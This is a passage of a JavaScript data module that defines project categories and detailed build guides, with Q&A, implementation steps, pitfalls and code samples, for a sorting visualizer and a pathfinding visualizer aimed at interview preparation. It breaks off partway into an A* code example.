// Project categories and topics — 24 projects across 5 categories

export const projectCategories = [
  { id: 'portfolio', name: 'Portfolio Projects', icon: 'star', color: '#8b5cf6' },
  { id: 'take-home', name: 'Take-Home Projects', icon: 'briefcase', color: '#f59e0b' },
  { id: 'full-stack', name: 'Full-Stack Applications', icon: 'layers', color: '#10b981' },
  { id: 'system-impl', name: 'System Design Implementation', icon: 'systemDesign', color: '#06b6d4' },
  { id: 'frontend', name: 'Frontend Challenges', icon: 'layout', color: '#ec4899' },
];

export const projectCategoryMap = {
  // Portfolio Projects
  'sorting-visualizer': 'portfolio',
  'pathfinding-visualizer': 'portfolio',
  'conways-game-of-life': 'portfolio',
  'markdown-editor': 'portfolio',
  'music-visualizer': 'portfolio',
  // Take-Home Projects
  'chatgpt-clone': 'take-home',
  'coffee-roastery-dashboard': 'take-home',
  'rare-book-library': 'take-home',
  'kanban-board': 'take-home',
  'ecommerce-product-page': 'take-home',
  // Full-Stack Applications
  'url-shortener': 'full-stack',
  'realtime-chat-app': 'full-stack',
  'job-board-api': 'full-stack',
  'social-media-feed': 'full-stack',
  'file-storage-service': 'full-stack',
  // System Design Implementation
  'rate-limiter-service': 'system-impl',
  'distributed-task-queue': 'system-impl',
  'api-gateway': 'system-impl',
  'realtime-dashboard': 'system-impl',
  'event-notification-system': 'system-impl',
  // Frontend Challenges
  'design-system-library': 'frontend',
  'virtual-scroll-table': 'frontend',
  'multi-step-form-wizard': 'frontend',
  'infinite-image-gallery': 'frontend',
};

export const projectTopics = [
  // ═══════════════════════════════════════════════════════════
  // PORTFOLIO PROJECTS
  // ═══════════════════════════════════════════════════════════
  {
    id: 'sorting-visualizer',
    title: 'Sorting Visualizer',
    icon: 'cpu',
    color: '#8b5cf6',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Next.js'],
    questions: 5,
    description: 'Build an interactive sorting algorithm visualizer with step-by-step animations, adjustable speed, and multiple algorithm support.',
    introduction: 'Create a web app that visually demonstrates how sorting algorithms work in real time. Users select an algorithm, adjust array size and speed, then watch bars animate through each comparison and swap. This project is a staple portfolio piece because it proves you understand both algorithms and frontend animation.\n\nSorting visualizers are one of the most recognizable CS education tools on the internet. Building one from scratch forces you to internalize how each algorithm partitions, compares, and rearranges data. Beyond academic value, this project exercises practical frontend skills: managing complex async state, coordinating animation frames with user input, and rendering hundreds of DOM elements performantly with CSS transitions.\n\nFrom an interview perspective, this project hits multiple dimensions simultaneously. It shows algorithmic literacy (you implemented six different sorts), frontend engineering chops (animation engine, responsive layout, keyboard shortcuts), and software architecture discipline (separating pure algorithm logic from UI rendering). Very few portfolio projects demonstrate all three at once.\n\nThe finished product is also instantly impressive in a live demo. Interviewers can watch algorithms race, see the visual difference between O(n squared) and O(n log n), and interact with speed and size controls. It turns an abstract whiteboard concept into something tangible and memorable.',
    interviewRelevance: 'Frequently asked in frontend interviews to demonstrate algorithm knowledge, state management skills, and the ability to build complex animations. Shows you can translate abstract CS concepts into tangible, interactive experiences. Sorting algorithm implementation is a staple of technical phone screens, and having a live demo proves you have gone beyond textbook memorization. Interviewers at companies like Google and Meta specifically look for candidates who can discuss time and space complexity trade-offs between algorithms, and this project gives you concrete examples to reference. The animation engine demonstrates event loop mastery: managing async generators, requestAnimationFrame timing, and React state updates without race conditions. Finally, the project architecture itself is a talking point for system design discussions, showing how you separate concerns between pure algorithm logic, animation orchestration, and UI rendering.',
    learningObjectives: [
      'Implement 6 sorting algorithms: Bubble, Selection, Insertion, Merge, Quick, and Heap sort',
      'Build step-by-step animation using async/await with configurable delay',
      'Manage complex application state with React Context or useReducer',
      'Create responsive bar chart visualization with dynamic height/color transitions',
      'Add controls for array size, speed, algorithm selection, and shuffle',
      'Design a clean separation between pure algorithm logic and UI rendering code',
      'Handle animation lifecycle edge cases: pause, resume, cancel, and algorithm switching mid-run',
      'Build keyboard accessibility with shortcuts for all major actions (play, pause, shuffle, select algorithm)',
      'Implement a performance metrics panel displaying live comparison and swap counts per algorithm',
      'Create a side-by-side algorithm race mode that runs multiple sorts simultaneously on identical input',
    ],
    keyQuestions: [
      { question: 'Which sorting algorithms should I implement?', answer: 'Start with Bubble Sort because it is the simplest to animate and reason about. Each outer pass moves the largest unsorted element to its final position, which creates a satisfying visual sweep. Next add Selection Sort (scans for the minimum each pass) and Insertion Sort (shifts elements right to insert each new element). These three O(n squared) algorithms are easy to implement and visually distinct. Then add the O(n log n) algorithms: Merge Sort (recursive divide-and-merge with an auxiliary buffer), Quick Sort (pivot selection with partition sweeps), and Heap Sort (heapify phase plus extraction). Implementing all six gives you a spectrum from simple to complex and lets you demonstrate the visual difference between quadratic and linearithmic time complexity.' },
      { question: 'How do I animate the sorting process?', answer: 'Use async generators that yield animation step objects for each comparison and swap. Each step contains a type field (compare, swap, or sorted), the indices involved, and a snapshot of the current array. The animation engine consumes these steps one at a time via a for-await loop, applying each step to the bar colors: comparing bars turn yellow, swapping bars turn red, and finalized bars turn green. A configurable delay between steps controls speed. Using generators is critical because they maintain internal execution state, making pause and resume trivial without any external index tracking. The generator simply stops yielding when paused and resumes from exactly where it left off.' },
      { question: 'What makes this impressive to interviewers?', answer: 'Several dimensions make this stand out. First, it demonstrates algorithm implementation beyond whiteboard pseudocode, with real working code that handles edge cases like already-sorted arrays and arrays with duplicate values. Second, the animation engine shows mastery of async JavaScript: generators, the event loop, and coordinating state updates with visual rendering. Third, the architecture proves you can design clean abstractions: algorithms are pure functions with no React dependencies, the animation hook manages the lifecycle, and the UI simply renders state. Fourth, the polish features matter: keyboard shortcuts, responsive layout, speed control, and a stats panel showing live comparison counts. Finally, having a deployed live demo URL is invaluable. Interviewers remember projects they can interact with, and a sorting visualizer is inherently engaging.' },
      { question: 'How should I structure the codebase?', answer: 'Organize into three clear layers. The /algorithms folder contains pure TypeScript async generator functions, one per sorting algorithm. Each accepts a number array and yields SortStep objects with no React imports whatsoever, making them independently unit-testable. The /hooks folder contains useSort (the animation engine that consumes generators) and useArray (array generation and state management). The /components folder holds the BarChart visualization, Controls panel, StatsPanel, and ComplexityTable. This separation means you can test algorithms in isolation, swap the UI framework without touching algorithm code, and reason about each layer independently. Add a /types folder for shared TypeScript interfaces like SortStep, BarState, and AlgorithmMeta.' },
      { question: 'What deployment approach works best?', answer: 'Vercel or Netlify provides instant deployment with a permanent live demo URL. Push to GitHub, connect the repo, and every commit deploys automatically. For maximum portfolio impact, add a comprehensive README with: a hero GIF showing the visualizer in action, a table of all supported algorithms with their time and space complexities, a description of the architecture, and a link to the live demo. Consider adding an Open Graph image so the link preview on LinkedIn or Twitter shows the visualizer. The live URL is what separates this from a GitHub-only project that nobody will actually run.' },
      { question: 'How do I handle Merge Sort visualization since it uses auxiliary space?', answer: 'Merge Sort is the trickiest to visualize because the merge phase copies elements into a temporary buffer before writing them back. In the generator, yield special step types that indicate buffer operations: copy-to-buffer (color the bar grey to indicate it is in auxiliary space) and write-back (color the bar its normal color at its new position). During the merge phase, show the two sorted halves being compared element by element, with the smaller element being placed into the next position. Skipping the buffer visualization makes the merge phase confusing to watch and misses the opportunity to visually explain the O(n) space cost that distinguishes Merge Sort from in-place algorithms like Quick Sort and Heap Sort.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Project Setup & Array Rendering',
        description: 'Scaffold the app, create the bar chart component, and render a randomized array as animated bars.',
        tasks: [
          'Initialize Next.js + TypeScript + Tailwind project, configure path aliases',
          'Create a generateArray(size) utility that returns random integers between 5 and 100',
          'Build a BarChart component that renders each value as a div with proportional height',
          'Wire up array size slider and shuffle button to regenerate the array',
          'Apply CSS transitions on bar height and background-color for smooth visual feedback',
        ],
      },
      {
        phase: 2,
        title: 'Algorithm Implementation',
        description: 'Write each sorting algorithm as an async generator that yields animation frames.',
        tasks: [
          'Implement Bubble Sort as an async generator yielding { type, indices, array } steps',
          'Implement Selection Sort and Insertion Sort generators with compare/swap events',
          'Implement Merge Sort generator — yield comparisons during merge phase, track auxiliary array',
          'Implement Quick Sort generator with pivot highlight and partition sweep events',
          'Implement Heap Sort generator including heapify phase visualization',
        ],
      },
      {
        phase: 3,
        title: 'Animation Engine & Controls',
        description: 'Build the animation loop that consumes algorithm steps and drives bar color/height updates.',
        tasks: [
          'Create an animateSort() function that iterates the generator with a configurable delay (setTimeout)',
          'Color-code bars: default (blue), comparing (yellow), swapping (red), sorted (green)',
          'Add Play/Pause/Stop controls; track animation running state to prevent concurrent runs',
          'Implement speed control (1x–20x) by mapping slider value to delay in milliseconds',
          'Disable algorithm/size controls while animation is running; re-enable on completion',
        ],
      },
      {
        phase: 4,
        title: 'Stats Panel & Polish',
        description: 'Add live algorithm statistics, complexity table, and final deployment touches.',
        tasks: [
          'Track and display live comparison count and swap count as the animation runs',
          'Add a complexity reference panel showing O(n) time/space for each algorithm',
          'Make the layout fully responsive — bars scale to fill available width on any screen size',
          'Add keyboard shortcut: Space to play/pause, R to shuffle, 1-6 to select algorithm',
          'Deploy to Vercel, add README with live demo GIF and algorithm complexity table',
        ],
      },
    ],
    fileStructure: `sorting-visualizer/
├── src/
│   ├── algorithms/
│   │   ├── bubbleSort.ts
│   │   ├── selectionSort.ts
│   │   ├── insertionSort.ts
│   │   ├── mergeSort.ts
│   │   ├── quickSort.ts
│   │   ├── heapSort.ts
│   │   └── index.ts          # re-exports all algorithms
│   ├── components/
│   │   ├── BarChart.tsx       # renders array as animated bars
│   │   ├── Controls.tsx       # algorithm selector, size slider, speed slider
│   │   ├── StatsPanel.tsx     # live comparison/swap counters
│   │   └── ComplexityTable.tsx
│   ├── hooks/
│   │   ├── useSort.ts         # animation loop, generator consumer
│   │   └── useArray.ts        # array generation and management
│   ├── types/
│   │   └── index.ts           # SortStep, BarState, AlgorithmMeta types
│   ├── utils/
│   │   └── arrayUtils.ts      # generateArray, sleep, swap helpers
│   ├── App.tsx
│   └── main.tsx
├── public/
├── tailwind.config.ts
├── tsconfig.json
└── package.json`,
    architectureLayers: [
      {
        name: 'Algorithm Layer',
        description: 'Pure TypeScript async generator functions in /algorithms. Each accepts the array and yields SortStep objects ({ type: "compare" | "swap" | "done", indices: number[], array: number[] }). No React dependencies — fully unit-testable in isolation.',
      },
      {
        name: 'Animation Engine (useSort hook)',
        description: 'Consumes the algorithm generator via a for-await loop, applies each step to component state, and enforces the configurable delay between frames. Manages play/pause/stop state machine and exposes controls to the UI.',
      },
      {
        name: 'State Management (useArray hook)',
        description: 'Owns the canonical array and bar-color state. Provides generateArray, shuffle, and setArray actions. Resets colors to default on shuffle or algorithm change.',
      },
      {
        name: 'Visualization Layer (BarChart)',
        description: 'Renders the array as a row of div elements sized by percentage height. Applies Tailwind color classes based on each bar\'s current state (default/comparing/swapping/sorted). CSS transitions handle smooth color and height changes between frames.',
      },
      {
        name: 'UI Controls Layer',
        description: 'Algorithm selector dropdown, array size and speed sliders, and play/pause/shuffle buttons. All inputs are disabled while animation is running to prevent state corruption.',
      },
    ],
    codeExamples: {
      typescript: `// algorithms/bubbleSort.ts
export type SortStep = {
  type: 'compare' | 'swap' | 'sorted';
  indices: number[];
  array: number[];
};

export async function* bubbleSort(
  arr: number[]
): AsyncGenerator<SortStep> {
  const a = [...arr];
  const n = a.length;

  for (let i = 0; i < n - 1; i++) {
    for (let j = 0; j < n - i - 1; j++) {
      // Yield a comparison step (turn bars yellow)
      yield { type: 'compare', indices: [j, j + 1], array: [...a] };

      if (a[j] > a[j + 1]) {
        [a[j], a[j + 1]] = [a[j + 1], a[j]];
        // Yield a swap step (turn bars red)
        yield { type: 'swap', indices: [j, j + 1], array: [...a] };
      }
    }
    // Mark the last unsorted element as sorted (turn green)
    yield { type: 'sorted', indices: [n - i - 1], array: [...a] };
  }
  yield { type: 'sorted', indices: [0], array: [...a] };
}

// hooks/useSort.ts
export function useSort() {
  const [bars, setBars] = useState<BarState[]>([]);
  const [running, setRunning] = useState(false);
  const speedRef = useRef(50); // ms delay

  const animate = async (algorithm: SortAlgorithm, arr: number[]) => {
    setRunning(true);
    const gen = algorithm([...arr]);

    for await (const step of gen) {
      setBars(applyStep(step));
      await sleep(speedRef.current);
    }
    setRunning(false);
  };

  return { bars, running, animate, setSpeed: (v: number) => { speedRef.current = v; } };
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Async generators vs pre-computed step arrays',
        picked: 'Async generators',
        reason: 'Generators stream steps lazily — no memory spike for large arrays. Pre-computing all steps for Quick Sort on a 200-element array can produce 10K+ objects. Generators also make pause/resume trivially easy: just stop consuming the generator.',
      },
      {
        choice: 'CSS transitions vs JavaScript animation (requestAnimationFrame)',
        picked: 'CSS transitions on bar color and height',
        reason: 'CSS transitions offload interpolation to the browser compositor and avoid layout thrashing. With rAF you have to manually interpolate every frame. CSS transitions give smoother 60fps results with less code, and the step-based nature of sorting already provides natural animation frames.',
      },
      {
        choice: 'React Context vs prop drilling vs Zustand',
        picked: 'React Context with useReducer',
        reason: 'For a project this size, Context + useReducer is sufficient and adds zero bundle overhead. Zustand is better for larger apps or when you need fine-grained subscriptions. Prop drilling breaks down at 3+ component levels, which this architecture exceeds.',
      },
      {
        choice: 'Next.js vs Vite + React',
        picked: 'Next.js',
        reason: 'Next.js provides instant deployment to Vercel with a live URL, which matters for portfolio visibility. There is no SSR benefit for a client-only app, but the Next.js brand signals familiarity with modern React tooling. Vite is faster to develop with locally but adds a deployment step.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'Why async generators are ideal for animation steps',
        detail: 'Generators maintain internal execution state — they remember exactly where they paused. This maps perfectly to algorithm animation: each yield is a frame you can pause on. The for-await loop gives you built-in backpressure: you consume one step, apply it to the UI, wait for the delay, then pull the next step. You never buffer more frames than you need.',
      },
      {
        topic: 'Time and space complexity as visual properties',
        detail: 'O(n²) algorithms (Bubble, Selection, Insertion) show quadratic visual work — the outer loop sweeps the full array n times. O(n log n) algorithms (Merge, Heap, Quick) show logarithmic subdivisions. This is genuinely educational: viewers can see why Merge Sort is faster by watching it split and conquer, versus Bubble Sort\'s exhaustive sweeps.',
      },
      {
        topic: 'Heap Sort and the max-heap property',
        detail: 'Heap Sort is the hardest to visualize because the heapify phase rearranges the array into a max-heap (parent always larger than children) before sorting. You need to yield steps for both the heapify phase AND the extraction phase. The extraction phase is visually satisfying: the largest element bubbles to the end, then the heap rebuilds for the next largest.',
      },
      {
        topic: 'In-place vs auxiliary space in Merge Sort animation',
        detail: 'Pure Merge Sort requires O(n) auxiliary space for the merge phase. In a visualizer, you must track which bars belong to the merge buffer versus the original array. A common technique: color the merge buffer bars differently (grey), then animate the merge back into the original positions. Skipping this makes the merge phase confusing to watch.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Mutating the array inside the algorithm before yielding',
        why: 'If you yield a reference to the same array you are mutating, every rendered frame will show the final state because React renders asynchronously. The array object\'s reference never changes, so React bails out of re-renders.',
        solution: 'Always yield a shallow copy: yield { array: [...a] }. This creates a new array reference per step, ensuring React detects the state change and re-renders.',
      },
      {
        pitfall: 'Running multiple animation loops simultaneously',
        why: 'If a user clicks Sort while an animation is in progress, two generators run concurrently, both calling setState on the same bars array. The result is visual flickering and incorrect final state.',
        solution: 'Track a running boolean in state. Disable the sort button when running is true. On stop/reset, abort the current generator loop via a cancellation flag (abortRef.current = true) checked inside the for-await loop.',
      },
      {
        pitfall: 'Stale closure on the speed ref inside the animation loop',
        why: 'If speed is stored in component state rather than a ref, the for-await loop captures the initial speed value in closure and never sees updates the user makes to the speed slider mid-animation.',
        solution: 'Store speed in useRef. The for-await loop reads speedRef.current on every iteration, so slider changes take effect immediately without restarting the animation.',
      },
      {
        pitfall: 'Not resetting bar colors before starting a new sort',
        why: 'If a previous sort left some bars colored green (sorted), starting a new sort on the same array leaves stale green bars. The new algorithm\'s color logic does not know which bars were previously marked.',
        solution: 'On every new sort start and on shuffle, reset all bar states to the default color before running the generator.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Already sorted array',
        impact: 'Bubble Sort completes in O(n) with zero swaps. Without an early-exit optimization, it still runs O(n²) comparisons, making it look slow even on a trivially easy input.',
        mitigation: 'Add a swapped flag to Bubble Sort: if an entire pass completes with no swaps, the array is sorted — break early. This is the standard optimization and worth explaining in your portfolio.',
      },
      {
        scenario: 'Array with all identical values',
        impact: 'Quick Sort degrades to O(n²) with naive pivot selection (first or last element), since every partition produces one empty side and one n-1 side.',
        mitigation: 'Use median-of-three pivot selection (pick median of first, middle, last element) or random pivot. The visualizer makes this degradation visible, which is a great teaching moment.',
      },
      {
        scenario: 'Very small arrays (n <= 3)',
        impact: 'Some algorithm implementations have off-by-one errors or skip edge conditions for arrays of length 1 or 2. A single-element array should immediately yield a sorted step without any iterations.',
        mitigation: 'Add a guard at the start of each algorithm generator: if arr.length <= 1, yield the sorted step and return immediately.',
      },
      {
        scenario: 'Rapid size changes while sorting is paused',
        impact: 'If the user changes array size while the animation is paused mid-sort, the generator holds a reference to the old array length. Resuming causes index-out-of-bounds errors.',
        mitigation: 'Changing array size should always cancel any in-progress animation and reset to a fresh unsorted array. Disable the size slider while running or paused — only allow changes in idle state.',
      },
    ],
    interviewFollowups: [
      {
        question: 'Why did you use a generator instead of just collecting all steps into an array first?',
        answer: 'Memory efficiency and pause/resume simplicity. For Quick Sort on a 300-element array, pre-computing every comparison and swap can generate 30,000+ step objects before the animation even begins. Generators stream steps lazily — you consume exactly one step per animation frame. Pause/resume is also trivial: you just stop and restart the for-await loop without any index tracking.',
      },
      {
        question: 'How does your Merge Sort handle the fact that it is not in-place?',
        answer: 'Merge Sort uses an auxiliary buffer for the merge phase. In the visualizer, I track which elements are in the merge buffer by maintaining a separate color state for those indices. During the merge, I animate elements being copied into the buffer (grey), then animate them being written back to the main array (green). This makes the O(n) space cost visually explicit.',
      },
      {
        question: 'How would you extend this to support algorithm comparisons side by side?',
        answer: 'I would refactor the state to hold N independent sort instances, each with their own array, bar colors, and generator. Render them in a grid layout. Add a Race mode button that starts all algorithms simultaneously on the same initial array. The first to complete highlights in gold. This is a compelling feature because it makes the time complexity differences viscerally obvious.',
      },
      {
        question: 'What would you do differently if this needed to support 10,000-element arrays?',
        answer: 'Three changes: batch multiple steps per animation frame instead of one step per frame — at 10K elements, individual-step updates drop below 60fps. Skip rendering intermediate comparison steps and only render swap steps to reduce total frame count. Switch from div bars to an HTML Canvas implementation — rendering 10K divs per frame causes layout thrashing; Canvas drawRect calls are orders of magnitude faster.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Algorithm Race Mode',
        difficulty: 'intermediate',
        description: 'Run all 6 algorithms simultaneously on the same initial array in a grid layout. Each finishes independently. Track and display which finishes first, second, etc. Makes time complexity differences viscerally obvious and is incredibly impressive in a portfolio demo.',
      },
      {
        idea: 'Step-by-Step Explanation Mode',
        difficulty: 'beginner',
        description: 'Add a text panel below the visualizer that narrates each step in plain English: "Comparing index 3 (value 42) with index 4 (value 17) — they are out of order, swapping." Synchronize the explanation with the animation. Makes the project genuinely educational and great for non-technical interviewers.',
      },
      {
        idea: 'Sound Visualization',
        difficulty: 'intermediate',
        description: 'Play a tone whose pitch corresponds to the height of the bar being compared or swapped, using the Web Audio API (oscillator node). The resulting audio pattern is distinctive per algorithm — Bubble Sort sounds chaotic, Merge Sort sounds structured. A famous YouTube demo does this and gets millions of views.',
      },
      {
        idea: 'Custom Input Mode',
        difficulty: 'beginner',
        description: 'Allow users to type a comma-separated list of numbers to use as the input array. Add validation for non-numeric input and a max size cap. This lets users test worst-case inputs (already sorted, reverse sorted, all equal) deliberately, turning the visualizer into an educational tool.',
      },
    ],
  },
  {
    id: 'pathfinding-visualizer',
    title: 'Pathfinding Visualizer',
    icon: 'grid',
    color: '#6366f1',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Vite'],
    questions: 5,
    description: 'Build an interactive grid-based pathfinding visualizer with maze generation, multiple algorithms (BFS, DFS, Dijkstra, A*), and wall drawing.',
    introduction: 'Create a grid where users place start/end nodes, draw walls, generate mazes, and watch pathfinding algorithms explore the grid in real time. This project combines graph algorithms, interactive UI, and animation — a powerful trio for any portfolio.\n\nPathfinding is one of the most visually rewarding algorithm topics to implement. Watching BFS expand outward like a flood fill, seeing A* laser-focus toward the target, or observing DFS wind through corridors creates an intuitive understanding that no textbook diagram can match. Building the visualizer yourself means you encounter every edge case: diagonal vs cardinal movement, tie-breaking in priority queues, and heuristic admissibility.\n\nThis project also exercises serious frontend engineering. The grid can have 1,500+ cells, each needing real-time color updates during animation. Naive React re-renders of the entire grid per step would destroy performance, so you must use direct DOM manipulation during animation and sync back to React state afterward. Handling mouse interactions for wall drawing, node dragging, and touch support adds another layer of complexity.\n\nFor interviews, this is a goldmine. Graph traversal questions are among the most frequently asked algorithmic topics, and having a live demo where you can walk through BFS vs Dijkstra vs A* with an interviewer is enormously powerful. It also demonstrates UI engineering: responsive grids, animation systems, and complex state management.',
    interviewRelevance: 'Graph traversal is one of the most common interview topics. Building a visualizer proves deep understanding of BFS, DFS, Dijkstra, and A* — not just textbook knowledge but practical implementation with edge cases handled. Interviewers frequently ask candidates to implement BFS or Dijkstra on a whiteboard, and this project lets you demonstrate a working implementation with visual proof. The difference between BFS and A* on a grid is a classic follow-up question, and your visualizer can show it in real time. The maze generation algorithms demonstrate recursive thinking and backtracking, which are staple interview patterns. Performance optimization (direct DOM manipulation for 1,500+ cells) shows you understand the React rendering pipeline and know when to bypass it. Finally, this project naturally leads into system design conversations about navigation systems, game pathfinding, and network routing.',
    learningObjectives: [
      'Implement BFS, DFS, Dijkstra, and A* pathfinding algorithms on a 2D grid',
      'Build maze generation algorithms (Recursive Division, Binary Tree)',
      'Create an interactive grid with click-to-draw walls and drag start/end nodes',
      'Animate algorithm exploration with visited/path/wall/start/end color states',
      'Add speed control, grid clear, and algorithm comparison features',
      'Understand heuristic functions and their impact on A* performance and optimality',
      'Implement direct DOM manipulation for animation performance on large grids',
      'Build weighted nodes to demonstrate why Dijkstra outperforms BFS on non-uniform graphs',
      'Handle touch events for mobile wall-drawing and node dragging support',
      'Create a statistics panel comparing nodes visited, path length, and execution time across algorithms',
    ],
    keyQuestions: [
      { question: 'How does the grid data structure work?', answer: 'Model the grid as a 2D array of node objects, each with properties: row, col, isWall, isStart, isEnd, isVisited, isPath, distance, previousNode, and optionally weight for weighted grids. The grid component renders this array as a CSS grid of div cells. Each cell receives conditional CSS classes based on its state (wall cells get a dark background, visited cells get a blue animation, path cells get a yellow highlight). The key design decision is keeping the grid as a flat data structure that the algorithm functions can operate on directly, rather than coupling it to React component state during animation.' },
      { question: 'What is the difference between BFS and Dijkstra on an unweighted grid?', answer: 'On an unweighted grid where all edges cost 1, BFS and Dijkstra produce identical shortest paths because BFS naturally explores nodes in order of distance from the source. Dijkstra becomes meaningful when you add weighted nodes such as terrain types: grass costs 1, sand costs 3, water costs 5. With weights, BFS fails to find the true shortest path because it explores by hop count, not total cost. A* adds a heuristic estimate of the remaining distance to the goal (Manhattan distance for a 4-directional grid, Euclidean for 8-directional). This heuristic lets A* skip exploring nodes far from the target, often visiting 60-80% fewer nodes than Dijkstra while still guaranteeing the optimal path, as long as the heuristic is admissible (never overestimates).' },
      { question: 'How do I implement maze generation?', answer: 'Recursive Division is the most visually impressive: start with an empty grid, pick a random row and column to divide the space into four quadrants by adding walls along those lines, then leave a single random gap in each wall segment. Recursively apply the same process to each quadrant until the regions are too small to subdivide. Binary Tree is simpler: iterate each cell and randomly carve a passage either north or east (never both), which produces a maze with a strong diagonal bias. You can also implement randomized DFS (recursive backtracking): start from a random cell, randomly pick an unvisited neighbor, carve a passage, and recurse. When stuck, backtrack. This produces mazes with long winding corridors. Animating the maze generation itself adds extra visual interest.' },
      { question: 'How should I handle animation performance?', answer: 'The grid typically has 40 columns by 20 rows, producing 800 cells. With some algorithms visiting 600+ cells, you need one color update per visited cell per frame. Naive approach: update React state per cell, causing 600 full-grid re-renders. This drops below 30fps even on fast machines. Instead, use direct DOM class manipulation during animation: give each cell a data attribute with its row and column, select it via querySelector, and toggle CSS classes directly. After the entire animation completes, sync the final state back to React by calling setState once with the fully-computed grid. For speed presets, batch multiple cell updates per setTimeout callback: Slow animates 1 cell per 100ms, Medium does 5 cells per 25ms, Fast does 20 cells per 5ms.' },
      { question: 'What features distinguish this from other implementations?', answer: 'Several features elevate this beyond a basic implementation. Weighted nodes let users click to increase a cell weight, visually shown by darker shading, which makes Dijkstra and A* behave differently from BFS. Bidirectional search runs two BFS instances (from start and from end) simultaneously and terminates when they meet in the middle, visiting roughly half the cells. An algorithm comparison mode with a split screen lets users run two algorithms side by side on the same maze. Maze presets offer one-click generation of different maze types. A statistics panel showing nodes visited, path length, and wall-clock execution time makes the algorithmic differences quantifiable. Mobile touch support with touch-to-draw walls and long-press-to-drag nodes makes the project accessible on tablets.' },
      { question: 'How does A* guarantee the shortest path?', answer: 'A* uses a priority queue ordered by f(n) = g(n) + h(n), where g(n) is the actual cost from the start to node n, and h(n) is the heuristic estimate of the cost from n to the goal. If the heuristic is admissible (never overestimates the true remaining cost) and consistent (satisfies the triangle inequality), A* is guaranteed to find the optimal shortest path. Manhattan distance is admissible for 4-directional grids because the shortest possible path between two points is exactly the Manhattan distance (no shortcuts through diagonals). Euclidean distance is admissible for 8-directional grids. If you use an inadmissible heuristic (one that overestimates), A* finds paths faster but they may not be optimal. This trade-off between optimality and speed is a great interview discussion point.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Grid Setup & Interaction',
        description: 'Build the 2D grid data structure, render it as a CSS grid, and implement mouse-based wall drawing and node dragging.',
        tasks: [
          'Initialize a 2D array of Node objects with row, col, isWall, isStart, isEnd, isVisited, isPath, distance, previousNode fields',
          'Render the grid as a CSS grid of div cells, each styled by node state (wall/start/end/default)',
          'Implement mousedown + mousemove wall painting — toggle isWall on drag across cells',
          'Add drag-to-reposition start and end nodes with mousedown on those specific cells',
          'Wire up Clear Walls and Reset Grid buttons that restore node states without regenerating the grid',
        ],
      },
      {
        phase: 2,
        title: 'Pathfinding Algorithms',
        description: 'Implement BFS, DFS, Dijkstra, and A* as functions that return ordered arrays of visited nodes and the final path.',
        tasks: [
          'Implement BFS using a queue — returns visitedNodesInOrder and nodesInShortestPath arrays',
          'Implement DFS using a stack — note that DFS does NOT guarantee the shortest path',
          'Implement Dijkstra with a min-priority queue — identical to BFS on unweighted grids, shows difference on weighted nodes',
          'Implement A* with Manhattan distance heuristic — f(n) = g(n) + h(n) where g = cost from start, h = Manhattan to end',
          'Extract the path by tracing previousNode pointers back from the end node to the start',
        ],
      },
      {
        phase: 3,
        title: 'Animation System',
        description: 'Build the two-phase animation: visited nodes expand outward, then the shortest path traces from end to start.',
        tasks: [
          'Animate visited nodes with staggered setTimeout calls (one node per delay interval)',
          'After visited animation completes, animate the path nodes in reverse order from end to start',
          'Use direct DOM class manipulation (not React state) during animation for performance — avoids re-rendering all 1500+ cells per frame',
          'Sync DOM state back to React state array after animation completes',
          'Add speed presets: Slow (100ms), Medium (25ms), Fast (5ms)',
        ],
      },
      {
        phase: 4,
        title: 'Maze Generation & Polish',
        description: 'Add maze generation algorithms and final UX polish.',
        tasks: [
          'Implement Recursive Division maze generator — recursively add walls with one gap per wall',
          'Implement Binary Tree maze — for each cell, randomly carve north or east passage',
          'Add algorithm info panel showing visited count, path length, and whether path was found',
          'Make grid cells scale responsively based on viewport width (fewer columns on mobile)',
          'Deploy to Vercel, add README with a GIF showing each algorithm and maze type',
        ],
      },
    ],
    fileStructure: `pathfinding-visualizer/
├── src/
│   ├── algorithms/
│   │   ├── bfs.ts
│   │   ├── dfs.ts
│   │   ├── dijkstra.ts
│   │   ├── aStar.ts
│   │   └── pathUtils.ts      # getNodesInShortestPath, getNeighbors
│   ├── mazes/
│   │   ├── recursiveDivision.ts
│   │   └── binaryTree.ts
│   ├── components/
│   │   ├── Grid.tsx           # renders 2D node array as CSS grid
│   │   ├── Cell.tsx           # individual grid cell with state-based styling
│   │   ├── Controls.tsx       # algorithm select, maze select, speed, run/clear
│   │   └── StatsPanel.tsx     # visited count, path length, time
│   ├── hooks/
│   │   ├── useGrid.ts         # grid state, wall drawing, node dragging
│   │   └── useAnimation.ts    # staggered setTimeout animation runner
│   ├── types/
│   │   └── index.ts           # Node, GridState, Algorithm types
│   ├── App.tsx
│   └── main.tsx
├── public/
├── vite.config.ts
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Grid State Layer (useGrid)',
        description: 'Owns the 2D Node array. Handles wall toggling on drag, start/end node repositioning, and grid reset operations. Exposes the grid array and mutation helpers to child components.',
      },
      {
        name: 'Algorithm Layer',
        description: 'Pure functions in /algorithms — each takes the grid and start/end nodes, returns { visitedNodesInOrder, nodesInShortestPath }. No side effects, no React dependencies. The algorithms operate on a snapshot copy of the grid so live interaction cannot corrupt a running traversal.',
      },
      {
        name: 'Animation Layer (useAnimation)',
        description: 'Takes the ordered arrays from the algorithm layer and applies timed DOM class mutations. Uses direct DOM manipulation (not setState) during the animation loop to avoid re-rendering 1500+ Cell components on every step. Syncs back to React state once complete.',
      },
      {
        name: 'Maze Generation Layer',
        description: 'Standalone functions in /mazes that return a new grid with wall nodes set. Recursive Division divides the grid recursively with single-gap walls. Binary Tree is simpler — iterates each cell and randomly carves north or east.',
      },
      {
        name: 'Visualization Layer (Grid + Cell)',
        description: 'Grid renders the 2D array as a CSS grid. Cell applies conditional Tailwind classes based on node state (wall = dark grey, visited = blue, path = yellow, start = green, end = red). CSS transitions on background-color create smooth state-change animations.',
      },
    ],
    codeExamples: {
      typescript: `// algorithms/aStar.ts
type Node = {
  row: number; col: number; isWall: boolean;
  isStart: boolean; isEnd: boolean;
